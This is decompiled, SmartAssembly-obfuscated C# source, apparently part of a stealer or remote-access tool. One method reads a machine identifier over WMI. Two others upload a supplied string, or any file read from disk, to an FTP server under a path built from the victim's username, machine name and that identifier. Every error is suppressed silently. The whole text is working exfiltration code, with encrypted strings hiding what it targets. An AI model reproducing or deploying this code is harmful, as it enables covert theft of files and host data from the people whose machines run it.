using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

internal sealed class WspNJLioodtR
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string UyvXvDpzFTru()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402939));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402950)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402901);
			ManagementObject val3 = new ManagementObject(getString_0(107402896) + text2 + getString_0(107402887));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107402882)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389282) : text;
		}
	}

	public static void RgKMHASfAJQsg(string NJpCitTFJI = "URL", string jzhOvVVvSeQ = "USERNAME", string YdFcIAWDVfa = "ACCESO", string IkyTtXNsqsplEU = "")
	{
		try
		{
			string text = UyvXvDpzFTru();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(NJpCitTFJI + getString_0(107403538) + Environment.UserName + getString_0(107403557) + Environment.MachineName + getString_0(107403504) + text + getString_0(107403531));
			ftpWebRequest.Method = getString_0(107402857);
			ftpWebRequest.Credentials = new NetworkCredential(jzhOvVVvSeQ, YdFcIAWDVfa);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(IkyTtXNsqsplEU);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void diqCpqybOKjOLc(string LEUHjbmDfIfax = "URL", string DYpNoRDXHcvFKn = "USERNAME", string VrLTLGQGTfRxvH = "ACCESO", string grzPiYYthzZZ = "")
	{
		try
		{
			string text = UyvXvDpzFTru();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LEUHjbmDfIfax + getString_0(107403538) + Environment.UserName + getString_0(107403557) + Environment.MachineName + getString_0(107403504) + text + getString_0(107403504) + Path.GetFileName(grzPiYYthzZZ));
			ftpWebRequest.Method = getString_0(107402857);
			ftpWebRequest.Credentials = new NetworkCredential(DYpNoRDXHcvFKn, VrLTLGQGTfRxvH);
			byte[] array = File.ReadAllBytes(grzPiYYthzZZ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static WspNJLioodtR()
	{
		Strings.CreateGetStringDelegate(typeof(WspNJLioodtR));
	}
}
